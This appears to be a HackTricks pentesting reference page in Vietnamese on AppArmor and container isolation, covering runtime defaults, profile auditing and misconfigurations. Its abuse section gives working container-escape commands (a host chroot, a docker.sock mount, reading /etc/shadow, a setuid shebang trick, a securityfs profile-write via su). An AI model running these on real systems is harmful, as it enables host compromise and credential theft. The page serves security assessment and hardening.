# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Tổng quan

AppArmor là một hệ thống **Mandatory Access Control** áp dụng các hạn chế thông qua profile riêng cho từng chương trình. Khác với các kiểm tra DAC truyền thống, vốn phụ thuộc nhiều vào quyền sở hữu của người dùng và nhóm, AppArmor cho phép kernel thực thi một chính sách gắn với chính tiến trình đó. Trong môi trường container, điều này rất quan trọng vì workload có thể có đủ quyền truyền thống để thử thực hiện một hành động nhưng vẫn bị từ chối do profile AppArmor không cho phép truy cập đường dẫn, mount, hành vi mạng hoặc sử dụng capability tương ứng.

Điểm khái niệm quan trọng nhất là AppArmor **dựa trên đường dẫn**. AppArmor xét quyền truy cập filesystem thông qua các quy tắc đường dẫn thay vì thông qua nhãn như SELinux. Cách tiếp cận này dễ hiểu và mạnh mẽ, nhưng cũng có nghĩa là cần chú ý kỹ đến bind mount và các bố cục đường dẫn thay thế. Nếu cùng một nội dung trên host có thể được truy cập thông qua một đường dẫn khác, tác động của chính sách có thể không như điều người vận hành dự tính ban đầu.

## Vai trò trong cô lập container

Các đợt đánh giá bảo mật container thường chỉ dừng lại ở capabilities và seccomp, nhưng AppArmor vẫn tiếp tục có vai trò sau những bước kiểm tra đó. Hãy hình dung một container có nhiều quyền hơn mức cần thiết hoặc một workload cần thêm một capability vì lý do vận hành. AppArmor vẫn có thể hạn chế quyền truy cập tệp, hành vi mount, mạng và các kiểu thực thi, qua đó ngăn chặn những đường khai thác rõ ràng. Đây là lý do việc vô hiệu hóa AppArmor "chỉ để ứng dụng hoạt động" có thể âm thầm biến một cấu hình vốn chỉ tiềm ẩn rủi ro thành cấu hình có thể bị khai thác trực tiếp.

## Lab

Để kiểm tra AppArmor có đang hoạt động trên host hay không, hãy dùng:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Để xem tiến trình container hiện tại đang chạy dưới:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Sự khác biệt này rất đáng chú ý. Trong trường hợp thông thường, tiến trình sẽ hiển thị ngữ cảnh AppArmor gắn với profile do runtime chọn. Trong trường hợp unconfined, lớp hạn chế bổ sung đó biến mất.

Bạn cũng có thể kiểm tra những gì Docker cho biết nó đã áp dụng:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Sử dụng khi chạy

Docker có thể áp dụng profile AppArmor mặc định hoặc tùy chỉnh khi host hỗ trợ. Podman cũng có thể tích hợp với AppArmor trên các hệ thống dựa trên AppArmor, mặc dù trên các bản phân phối ưu tiên SELinux, hệ thống MAC còn lại thường đóng vai trò trung tâm. Kubernetes có thể cung cấp chính sách AppArmor ở cấp workload trên các node thực sự hỗ trợ AppArmor. LXC và các môi trường system-container liên quan thuộc họ Ubuntu cũng sử dụng AppArmor rộng rãi.

Điểm thực tế cần lưu ý là AppArmor không phải là một "tính năng của Docker". Đây là một tính năng của kernel host mà một số runtime có thể chọn áp dụng. Nếu host không hỗ trợ hoặc runtime được cấu hình chạy ở chế độ unconfined, thì trên thực tế không có lớp bảo vệ như mong đợi.

Riêng với Kubernetes, API hiện đại là `securityContext.appArmorProfile`. Kể từ Kubernetes `v1.30`, các annotation AppArmor beta cũ đã bị deprecated. Trên các host được hỗ trợ, `RuntimeDefault` là profile mặc định, còn `Localhost` trỏ đến một profile phải được nạp sẵn trên node. Điều này quan trọng khi rà soát vì manifest có thể trông như đã hỗ trợ AppArmor nhưng vẫn phụ thuộc hoàn toàn vào việc node hỗ trợ và có sẵn các profile được nạp.<sup>[[1]](#references)</sup>

Một chi tiết vận hành tinh tế nhưng hữu ích là việc đặt rõ `appArmorProfile.type: RuntimeDefault` sẽ nghiêm ngặt hơn so với bỏ qua trường này. Nếu trường được đặt rõ ràng mà node không hỗ trợ AppArmor, bước admission sẽ thất bại. Nếu bỏ qua trường này, workload vẫn có thể chạy trên node không có AppArmor và đơn giản là không được hưởng thêm lớp giới hạn đó. Từ góc nhìn của attacker, đây là lý do chính đáng để kiểm tra cả manifest lẫn trạng thái thực tế của node.<sup>[[1]](#references)</sup>

Trên các host hỗ trợ Docker và AppArmor, profile mặc định nổi tiếng nhất là `docker-default`. Profile này được tạo từ template AppArmor của Moby và rất quan trọng vì giúp giải thích tại sao một số PoC dựa trên capability vẫn thất bại trong container mặc định. Nói khái quát, `docker-default` cho phép mạng thông thường, từ chối ghi vào phần lớn `/proc`, từ chối truy cập các phần nhạy cảm của `/sys`, chặn các thao tác mount và hạn chế ptrace để nó không trở thành một công cụ dò tìm host dùng được cho mọi mục đích. Hiểu rõ cấu hình cơ sở này giúp phân biệt giữa "container có `CAP_SYS_ADMIN`" và "container thực sự có thể dùng capability đó để tác động đến các giao diện kernel mà tôi quan tâm".

## Quản lý profile

Profile AppArmor thường được lưu dưới `/etc/apparmor.d/`. Một quy ước đặt tên phổ biến là thay dấu gạch chéo trong đường dẫn executable bằng dấu chấm. Ví dụ, profile cho `/usr/bin/man` thường được lưu dưới dạng `/etc/apparmor.d/usr.bin.man`. Chi tiết này quan trọng trong cả phòng thủ lẫn đánh giá bảo mật, vì khi biết tên profile đang hoạt động, bạn thường có thể nhanh chóng tìm được file tương ứng trên host.

Một số lệnh quản lý hữu ích ở phía host gồm:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Lý do các lệnh này quan trọng trong tài liệu tham khảo về bảo mật container là chúng giải thích cách tạo, tải, chuyển sang complain mode và sửa đổi profile sau khi ứng dụng thay đổi. Nếu người vận hành có thói quen chuyển profile sang complain mode khi khắc phục sự cố rồi quên khôi phục enforcement, container có thể trông như được bảo vệ theo tài liệu nhưng trên thực tế lại hoạt động với các giới hạn lỏng lẻo hơn nhiều.

### Tạo Và Cập Nhật Profile

`aa-genprof` có thể theo dõi hành vi ứng dụng và giúp tạo profile một cách tương tác:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` có thể tạo hồ sơ mẫu để sau này nạp bằng `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Khi tệp nhị phân thay đổi và cần cập nhật policy, `aa-logprof` có thể phát lại các lần từ chối được ghi trong log và hỗ trợ người vận hành quyết định có cho phép hay từ chối chúng:

```bash
sudo aa-logprof
```

### Nhật ký

Các lần từ chối của AppArmor thường có thể được xem qua `auditd`, syslog hoặc các công cụ như `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Điều này hữu ích cả về mặt vận hành lẫn tấn công. Người phòng thủ dùng nó để tinh chỉnh các profile. Kẻ tấn công dùng nó để tìm hiểu chính xác đường dẫn hoặc thao tác nào đang bị từ chối và liệu AppArmor có phải là cơ chế kiểm soát đang chặn một chuỗi khai thác hay không.

### Xác định chính xác tệp profile

Khi runtime hiển thị tên profile AppArmor cụ thể cho một container, việc ánh xạ tên đó về tệp profile trên đĩa thường rất hữu ích:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Điều này đặc biệt hữu ích khi rà soát từ phía host, vì nó thu hẹp khoảng cách giữa “container cho biết nó đang chạy dưới profile `lowpriv`” và “các quy tắc thực tế nằm trong tệp cụ thể này, có thể được kiểm tra hoặc tải lại”.

### Các quy tắc quan trọng cần kiểm tra

Khi có thể đọc một profile, đừng chỉ dừng lại ở các dòng `deny` đơn giản. Một số loại quy tắc có thể làm thay đổi đáng kể mức độ hữu hiệu của AppArmor trong việc chống lại nỗ lực thoát container:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: thực thi binary đích mà không bị giới hạn. Nếu một helper, shell hoặc interpreter có thể truy cập được và được cho phép bằng `ux`, đó thường là thứ đầu tiên cần kiểm tra.
- `px` / `Px` và `cx` / `Cx`: thực hiện chuyển đổi profile khi exec. Những quy tắc này không mặc nhiên là xấu, nhưng đáng để kiểm tra vì việc chuyển đổi có thể đưa tiến trình vào một profile rộng hơn nhiều so với profile hiện tại.
- `change_profile`: cho phép một tác vụ chuyển sang profile đã được tải khác, ngay lập tức hoặc ở lần exec tiếp theo. Nếu profile đích yếu hơn, đây có thể trở thành lối thoát được chủ đích khỏi một miền hạn chế.
- `flags=(complain)`, `flags=(unconfined)` hoặc `flags=(prompt)` mới hơn: các cờ này cần làm thay đổi mức độ tin cậy bạn đặt vào profile. `complain` ghi nhật ký các lần từ chối thay vì thực thi chúng, `unconfined` loại bỏ ranh giới bảo vệ, còn `prompt` phụ thuộc vào luồng quyết định ở userspace thay vì cơ chế từ chối được kernel thực thi thuần túy.
- `userns` hoặc `userns create,`: chính sách AppArmor mới hơn có thể kiểm soát việc tạo user namespace. Nếu profile container cho phép rõ ràng việc này, các user namespace lồng nhau vẫn có thể được sử dụng, ngay cả khi nền tảng dùng AppArmor như một phần trong chiến lược tăng cường bảo mật.

Lệnh grep hữu ích khi kiểm tra từ phía host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Loại kiểm tra này thường hữu ích hơn việc xem hàng trăm quy tắc tệp thông thường. Nếu một cuộc thoát container phụ thuộc vào việc thực thi một helper, vào một namespace mới hoặc thoát sang một profile ít hạn chế hơn, câu trả lời thường nằm trong các quy tắc hướng đến chuyển đổi này thay vì những dòng dễ thấy như `deny /etc/shadow r`.

## Cấu hình sai

Sai lầm rõ ràng nhất là `apparmor=unconfined`. Quản trị viên thường đặt tùy chọn này khi gỡ lỗi một ứng dụng bị lỗi vì profile đã chặn chính xác một thứ nguy hiểm hoặc không mong muốn. Nếu cờ này vẫn còn trong môi trường production, toàn bộ lớp MAC thực chất đã bị vô hiệu hóa.

Một vấn đề khó nhận ra hơn là cho rằng bind mount vô hại vì quyền của tệp trông bình thường. Vì AppArmor dựa trên đường dẫn, việc đưa các đường dẫn của host vào những vị trí mount thay thế có thể xung đột với các quy tắc đường dẫn. Sai lầm thứ ba là quên rằng tên profile trong tệp cấu hình chẳng có nhiều ý nghĩa nếu kernel của host không thực sự thực thi AppArmor.

## Lạm dụng

Khi AppArmor bị vô hiệu hóa, những thao tác trước đây bị hạn chế có thể đột nhiên thực hiện được: đọc các đường dẫn nhạy cảm thông qua bind mount, truy cập những phần của procfs hoặc sysfs vốn khó sử dụng hơn, thực hiện các thao tác liên quan đến mount nếu capabilities/seccomp cũng cho phép, hoặc sử dụng những đường dẫn mà profile thường chặn. AppArmor thường là cơ chế giải thích vì sao một nỗ lực thoát container dựa trên capability “đáng lẽ phải hoạt động” trên lý thuyết nhưng thực tế vẫn thất bại. Vô hiệu hóa AppArmor, và cùng nỗ lực đó có thể bắt đầu thành công.

Nếu bạn nghi ngờ AppArmor là thứ chính đang ngăn chặn một chuỗi lạm dụng dựa trên path-traversal, bind mount hoặc mount, bước đầu tiên thường là so sánh những gì có thể truy cập khi có và không có profile. Ví dụ: nếu một đường dẫn của host được mount bên trong container, trước tiên hãy kiểm tra xem bạn có thể đi qua và đọc đường dẫn đó hay không:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Nếu container cũng có một capability nguy hiểm như `CAP_SYS_ADMIN`, một trong những phép kiểm tra thực tế nhất là xác định liệu AppArmor có phải là cơ chế kiểm soát đang chặn các thao tác mount hoặc quyền truy cập vào các hệ thống tệp kernel nhạy cảm hay không:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Trong các môi trường đã có sẵn một đường dẫn trên host thông qua bind mount, việc mất AppArmor cũng có thể biến một vấn đề tiết lộ thông tin chỉ đọc thành khả năng truy cập trực tiếp vào tệp trên host:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Mục đích của các lệnh này không phải là AppArmor tự nó tạo ra lối thoát khỏi container. Mà là một khi AppArmor bị gỡ bỏ, nhiều cách lạm dụng filesystem và mount có thể được thử nghiệm ngay lập tức.

### Ví dụ đầy đủ: AppArmor bị tắt + root của host được mount

Nếu container đã bind-mount root của host tại `/host`, việc gỡ bỏ AppArmor có thể biến một cách lạm dụng filesystem vốn bị chặn thành một lối thoát hoàn toàn khỏi host:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Khi shell thực thi thông qua hệ thống tệp của host, workload về cơ bản đã thoát khỏi ranh giới container:

```bash
id
hostname
cat /etc/shadow | head
```

### Ví dụ đầy đủ: AppArmor bị vô hiệu hóa + Socket runtime

Nếu rào cản thực sự là AppArmor bảo vệ trạng thái runtime, thì chỉ cần một socket được mount là đủ để thoát hoàn toàn:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Đường dẫn chính xác phụ thuộc vào điểm mount, nhưng kết quả cuối cùng vẫn như nhau: AppArmor không còn ngăn truy cập vào runtime API, và runtime API có thể khởi chạy một container xâm phạm host.

### Ví dụ đầy đủ: Bypass Bind-Mount dựa trên đường dẫn

Vì AppArmor hoạt động dựa trên đường dẫn, việc bảo vệ `/proc/**` không tự động bảo vệ cùng nội dung procfs của host khi nội dung đó có thể được truy cập qua một đường dẫn khác:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Tác động phụ thuộc vào chính xác những gì được mount và liệu đường dẫn thay thế có đồng thời vượt qua các biện pháp kiểm soát khác hay không, nhưng mẫu này là một trong những lý do rõ ràng nhất cho thấy cần đánh giá AppArmor cùng với bố cục mount thay vì xem xét riêng lẻ.

### Ví dụ đầy đủ: Bypass Shebang

AppArmor có thể gắn profile với đường dẫn của script được thực thi thay vì interpreter được chỉ định trong shebang. Ngược lại, gọi trực tiếp interpreter có thể chọn profile của interpreter. Một [maintainer của AppArmor mô tả sự khác biệt này](https://bugs.launchpad.net/apparmor/+bug/1911431). Một ví dụ trong quá khứ liên quan đến một script có dòng đầu tiên trỏ đến một interpreter bị giới hạn:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Ví dụ này chỉ là một trường hợp có thể xảy ra, trong đó capability của interpreter có thể trở nên hiệu lực và attachment exec thực tế của script cho phép thao tác. Kiểm tra policy đã nạp và process label, capability bounding set, `no_new_privs` và trạng thái `nosuid` của mount; riêng tên file profile hoặc danh sách `cap_setuid+ep` không chứng minh rằng có thể thực hiện chuyển đổi. Cần xem xét riêng các chuỗi interpreter và đường thực thi thay thế.

## File kiểm soát policy như một primitive ghi có đặc quyền

Trên các kernel AppArmor bị ảnh hưởng, người dùng không có đặc quyền có thể mở file `.load`, `.replace` hoặc `.remove` trong securityfs để ghi, nhưng thao tác `write()` trực tiếp sẽ thất bại vì quyền quản trị policy được kiểm tra tại thời điểm ghi. Nếu một setuid helper kế thừa file descriptor đó làm stdout hoặc stderr rồi ghi các byte do attacker kiểm soát, kernel sẽ sử dụng thông tin xác thực của helper. Điều này khiến helper trở thành *trình ghi dữ liệu policy có đặc quyền*, chứ không phải cơ chế cấp quyền root nói chung cho caller. Qualys đã chứng minh rằng `su -P` có thể chuyển tiếp các byte từ một lệnh chạy với cùng người dùng qua đường PTY có đặc quyền; cách này yêu cầu tài khoản của người dùng có đặt mật khẩu. Hãy kiểm tra kernel và các bản vá cho `su` đã cài đặt, thay vì coi quyền ghi cho mọi người trên file là bằng chứng cho thấy hệ thống bị ảnh hưởng.<sup>[[3]](#references)[[4]](#references)</sup>

Trong một lab dùng một lần với kernel và helper bị ảnh hưởng, thao tác này tạo rồi xóa một profile thử nghiệm. Shell mở từng file kiểm soát trước khi `su` ghi vào đó; `stty raw` ngăn PTY relay thay đổi các byte của profile đã biên dịch. Không chạy thử nghiệm này trên profile production.<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

Cùng một primitive có thể thay thế profile hiện có. Ví dụ, một profile cho phép `userns` đối với trình khởi chạy có thể gỡ bỏ hạn chế user-namespace của AppArmor, nhưng không cấp các capability host-root; các sysctl namespace thực tế và những biện pháp kiểm soát khác vẫn rất quan trọng. Nó cũng có thể gỡ bỏ cơ chế confinement khỏi một tiến trình mục tiêu. Xem [các bước kiểm tra mức độ phơi nhiễm của kernel](../../../main-system-information/kernel-vulnerability-assessment.md) và [tổng quan về Linux Hardening](../../../) để biết quy trình leo thang đặc quyền rộng hơn.<sup>[[3]](#references)[[4]](#references)</sup>

## Kiểm tra

Mục tiêu của các bước kiểm tra này là nhanh chóng trả lời ba câu hỏi: AppArmor có được bật trên host không, tiến trình hiện tại có bị confinement không, và runtime có thực sự áp dụng một profile cho container này không?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Điều đáng chú ý ở đây:

- Nếu `/proc/self/attr/current` hiển thị `unconfined`, workload không được hưởng cơ chế confinement của AppArmor.
- Nếu `aa-status` cho thấy AppArmor bị tắt hoặc chưa được tải, mọi tên profile trong cấu hình runtime phần lớn chỉ mang tính hình thức.
- Nếu `docker inspect` hiển thị `unconfined` hoặc một custom profile không mong muốn, đó thường là lý do khiến một đường khai thác dựa trên filesystem hoặc mount hoạt động.
- Nếu `/sys/kernel/security/apparmor/profiles` không chứa profile bạn mong đợi, thì riêng cấu hình runtime hoặc orchestrator là chưa đủ.
- Nếu một profile được cho là đã harden có các quy tắc kiểu `ux`, `change_profile` rộng, `userns` hoặc `flags=(complain)`, thì ranh giới bảo vệ thực tế có thể yếu hơn nhiều so với tên profile gợi ý.

Nếu một container đã có đặc quyền nâng cao vì lý do vận hành, việc giữ AppArmor được bật thường tạo nên khác biệt giữa một ngoại lệ được kiểm soát và một sự cố bảo mật trên diện rộng hơn.

## Mặc định của runtime

| Runtime / nền tảng | Trạng thái mặc định | Hành vi mặc định | Cách làm suy yếu phổ biến |
| --- | --- | --- | --- |
| Docker Engine | Được bật theo mặc định trên các host hỗ trợ AppArmor | Sử dụng profile AppArmor `docker-default`, trừ khi bị ghi đè | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Tùy thuộc vào host | AppArmor được hỗ trợ thông qua `--security-opt`, nhưng mặc định chính xác phụ thuộc vào host/runtime và không phổ biến như profile `docker-default` được Docker tài liệu hóa | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Mặc định có điều kiện | Nếu không chỉ định `appArmorProfile.type`, giá trị mặc định là `RuntimeDefault`, nhưng chỉ được áp dụng khi AppArmor được bật trên node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` với profile yếu, các node không hỗ trợ AppArmor |
| containerd / CRI-O dưới Kubernetes | Phụ thuộc vào hỗ trợ của node/runtime | Các runtime phổ biến được Kubernetes hỗ trợ có hỗ trợ AppArmor, nhưng việc thực thi thực tế vẫn phụ thuộc vào hỗ trợ của node và cài đặt workload | Tương tự hàng Kubernetes; cấu hình runtime trực tiếp cũng có thể bỏ qua hoàn toàn AppArmor |

Với AppArmor, biến số quan trọng nhất thường là **host**, không chỉ là runtime. Cài đặt profile trong manifest không tạo ra confinement trên một node chưa bật AppArmor.



## References

- [1] [Ngữ cảnh bảo mật của Kubernetes: các trường profile AppArmor và cách hoạt động của hỗ trợ từ node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Trang man `apparmor.d(5)` của Ubuntu 24.04: chuyển đổi khi thực thi, `change_profile`, `userns` và các cờ profile](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Thông báo kỹ thuật Qualys CrackArmor](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Cơ sở kiến thức về lỗ hổng CrackArmor của Ubuntu](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
